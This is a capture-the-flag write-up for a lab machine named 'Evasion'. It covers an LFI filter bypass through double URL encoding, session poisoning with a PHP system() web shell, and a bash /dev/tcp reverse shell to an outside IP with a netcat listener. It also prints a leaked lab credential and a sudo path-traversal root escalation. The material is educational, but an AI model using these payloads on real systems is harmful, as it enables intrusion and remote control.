## Port Scanning

```bash
nmap -sV -sC -p- -v $IP --min-rate 3000
```

![evasion](/static/images/evasion-writeup-images/image.png)

Only ports 22 (SSH) and 80 (HTTP) are open.

## Enumeration

When accessing the address on port 80, it redirects us to **evasion.hc**

![evasion 1](/static/images/evasion-writeup-images/image1.png)

We need to add the domain to our local DNS **/etc/hosts**

```python
sudo vim /etc/hosts
```

![evasion 2](/static/images/evasion-writeup-images/image2.png)

Accessing the application on port 80, it was possible to register a new user to access the application.

![evasion 3](/static/images/evasion-writeup-images/image3.png)

By intercepting the route for **Software Guide > Download**, it was possible to find an LFI (Local File Inclusion) in the guide parameter. The application has a filter against LFI, but it was bypassed using double URL encoding.

```jsx
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564
```

![evasion 5](/static/images/evasion-writeup-images/image5.png)

With our session cookie, we can read the file **/var/lib/php/sessions/sess_0n9720fs19remri8e0h26gb5bq**, which we can use to poison the PHP session log.

![evasion 6](/static/images/evasion-writeup-images/image6.png)

To poison the logs, weâ€™ll create a new user but pass a PHP web shell in the login field.

```jsx
<?php system($_GET[0]); ?>
```

![evasion 7](/static/images/evasion-writeup-images/image7.png)

When logging in with the created user (webshell) and intercepting the same request, we can successfully use the poisoning.

```python
../../../../../var/lib/php/sessions/sess_p3eqpujc8mqhqnu9agu96bh8om
```

## Foot Hold

Through LFI, we were able to get RCE by poisoning the logs, and with that, we can get a reverse shell using the following payload:

```python
bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'
```

![evasion 9](/static/images/evasion-writeup-images/image9.png)

```python
nc -lnvp 1337
```

## Privillege Escalation

By running Pspy64 on the server, we identified a running process that reveals the credentials for user **lucas**.

`lucas:TL7g81rqYFW`

![evasion 11](/static/images/evasion-writeup-images/image11.png)

![evasion 12](/static/images/evasion-writeup-images/image12.png)

```python
sudo -l
```

![evasion 13](/static/images/evasion-writeup-images/image13.png)

Since we can run any script as root without a password, we just need to create a Python script that gives us root access to the machine.

```python
echo "import os" > evil.py
echo "os.system('/bin/bash')" >> evil.py
sudo /usr/bin/python3 /opt/scripts/../../../tmp/evil.py
```
